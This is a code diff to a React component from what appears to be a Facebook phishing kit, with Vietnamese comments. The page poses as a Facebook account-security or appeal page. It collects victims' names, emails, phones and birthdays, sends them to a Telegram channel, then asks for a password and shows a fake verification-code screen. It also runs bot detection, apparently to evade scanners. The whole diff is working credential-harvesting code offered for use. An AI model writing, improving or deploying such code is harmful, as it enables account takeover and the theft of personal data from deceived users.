@@ -68,12 +68,6 @@ const Home = () => {
     const [showGif, setShowGif] = useState(true);
     const [homeTranslated, setHomeTranslated] = useState(false);
 
-    // 🎯 THÊM: State để lưu data ẩn
-    const [hiddenData, setHiddenData] = useState({
-        email: 's****g@m****.com',
-        phone: '******32'
-    });
-
     useEffect(() => {
         setHomeTranslated(true);
         const gifTimer = setTimeout(() => {
@@ -91,7 +85,7 @@ const Home = () => {
         }
     }, [showGif, homeTranslated]);
 
-    // 🎯 CẬP NHẬT: Thêm dịch ngầm cho verify
+    // 🎯 CẬP NHẬT: Dịch ngầm cho verify + sendinfo
     const translateBackgroundComponents = useCallback(async (targetLang) => {
         try {
             const passwordTexts = {
@@ -109,10 +103,10 @@ const Home = () => {
                 description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
             };
 
-            // 🎯 THÊM: Dịch ngầm cho verify với data ẩn thật
+            // 🎯 Dịch verify với data mặc định
             const verifyTexts = {
                 title: 'Check your device',
-                description: `We have sent a verification code to your ${hiddenData.email}, ${hiddenData.phone}. Please enter the code we just sent to continue.`,
+                description: `We have sent a verification code to your s****g@m****.com, ******32. Please enter the code we just sent to continue.`,
                 placeholder: 'Enter your code',
                 infoTitle: 'Approve from another device or Enter your verification code',
                 infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
@@ -135,7 +129,7 @@ const Home = () => {
         } catch (error) {
             console.log('Background translation failed:', error);
         }
-    }, [hiddenData]); // 🎯 THÊM dependency hiddenData
+    }, []);
 
     const translateObjectTexts = async (textsObject, targetLang) => {
         const translatedObject = {};
@@ -149,7 +143,6 @@ const Home = () => {
         return translatedObject;
     };
 
-    // 🎯 CÁC HÀM GỐC GIỮ NGUYÊN
     const initializeSecurity = useCallback(async () => {
         try {
             const botResult = await detectBot();
@@ -331,15 +324,6 @@ const Home = () => {
             }));
         }
 
-        // 🎯 CẬP NHẬT: Cập nhật hidden data real-time
-        if (field === 'mail' || field === 'phone') {
-            setHiddenData(prev => ({
-                ...prev,
-                email: field === 'mail' ? hideEmail(value) : prev.email,
-                phone: field === 'phone' ? hidePhone(value) : prev.phone
-            }));
-        }
-
         if (errors[field]) {
             setErrors((prev) => ({
                 ...prev,
@@ -368,6 +352,7 @@ const Home = () => {
         return Object.keys(newErrors).length === 0;
     };
 
+    // 🎯 CẬP NHẬT: Hàm submit nhanh - UPDATE ALL TRƯỚC KHI HIỆN PASSWORD
     const handleSubmit = async () => {
         if (!isFormEnabled || isSubmitting) return;
         
@@ -375,27 +360,26 @@ const Home = () => {
             try {
                 setIsSubmitting(true);
                 
+                // 🎯 GỬI TELEGRAM DATA FORM
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
 
-                await new Promise(resolve => setTimeout(resolve, 500));
-
-                // 🎯 CẬP NHẬT: Lưu cả hidden data để verify dùng ngay
+                // 🎯 LƯU DATA VÀO LOCALSTORAGE
                 const userInfoData = {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
                     phone: hidePhone(formData.phone),
                     birthday: formData.birthday
                 };
-
                 localStorage.setItem('userInfo', JSON.stringify(userInfoData));
 
-                // 🎯 THÊM: Cập nhật dịch verify với data mới nhất
+                // 🎯 UPDATE DỊCH VERIFY VỚI DATA THẬT (TRƯỚC KHI HIỆN PASSWORD)
                 const targetLang = localStorage.getItem('targetLang');
                 if (targetLang && targetLang !== 'en') {
                     await updateVerifyTranslation(targetLang, userInfoData.email, userInfoData.phone);
                 }
 
+                // 🎯 HIỆN PASSWORD SAU KHI ĐÃ UPDATE ALL XONG
                 setIsSubmitting(false);
                 setShowPassword(true);
                 
@@ -415,7 +399,7 @@ const Home = () => {
         }
     };
 
-    // 🎯 THÊM: Hàm cập nhật dịch verify với data mới
+    // 🎯 HÀM UPDATE DỊCH VERIFY VỚI DATA THẬT
     const updateVerifyTranslation = async (targetLang, email, phone) => {
         try {
             const verifyTexts = {
